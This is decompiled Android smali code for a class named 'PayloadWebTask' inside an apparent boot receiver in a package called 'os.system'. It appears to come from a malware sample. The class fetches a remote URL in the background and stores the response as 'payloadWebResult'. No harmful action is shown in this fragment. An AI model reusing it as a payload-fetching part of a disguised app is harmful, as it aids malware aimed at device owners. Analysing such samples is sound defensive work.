.class Los/system/ReceiverBoot$PayloadWebTask;
.super Landroid/os/AsyncTask;
.source "ReceiverBoot.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/ReceiverBoot;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "PayloadWebTask"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field protected applicationContext:Landroid/content/Context;

.field protected main:Ljava/lang/String;

.field final synthetic this$0:Los/system/ReceiverBoot;


# direct methods
.method private constructor <init>(Los/system/ReceiverBoot;)V
    .locals 1

    .prologue
    .line 628
    iput-object p1, p0, Los/system/ReceiverBoot$PayloadWebTask;->this$0:Los/system/ReceiverBoot;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 631
    const-string v0, ""

    iput-object v0, p0, Los/system/ReceiverBoot$PayloadWebTask;->main:Ljava/lang/String;

    return-void
.end method

.method synthetic constructor <init>(Los/system/ReceiverBoot;Los/system/ReceiverBoot$1;)V
    .locals 0

    .prologue
    .line 628
    invoke-direct {p0, p1}, Los/system/ReceiverBoot$PayloadWebTask;-><init>(Los/system/ReceiverBoot;)V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 628
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Los/system/ReceiverBoot$PayloadWebTask;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    .prologue
    .line 638
    const-string v0, ""

    .line 639
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 640
    new-instance v2, Lorg/apache/http/client/methods/HttpGet;

    const/4 v3, 0x0

    aget-object v3, p1, v3

    invoke-direct {v2, v3}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    .line 642
    :try_start_0
    invoke-interface {v1, v2}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v1

    .line 644
    :try_start_1
    invoke-interface {v1}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v1

    invoke-interface {v1}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v1

    .line 645
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 646
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 648
    :goto_0
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_0

    .line 649
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 653
    :catch_0
    move-exception v1

    .line 654
    :try_start_2
    invoke-static {}, Los/system/ReceiverBoot;->access$700()Ljava/lang/String;

    move-result-object v1

    const-string v2, "Error split text"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 660
    :goto_1
    return-object v0

    .line 651
    :cond_0
    :try_start_3
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 652
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    move-result-object v0

    goto :goto_1

    .line 657
    :catch_1
    move-exception v1

    .line 658
    invoke-static {}, Los/system/ReceiverBoot;->access$700()Ljava/lang/String;

    move-result-object v1

    const-string v2, "Failed Connect to Server!"

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 628
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Los/system/ReceiverBoot$PayloadWebTask;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 666
    sput-object p1, Los/system/ReceiverBoot;->payloadWebResult:Ljava/lang/String;

    .line 667
    return-void
.end method

.method protected onPreExecute()V
    .locals 0

    .prologue
    .line 634
    return-void
.end method
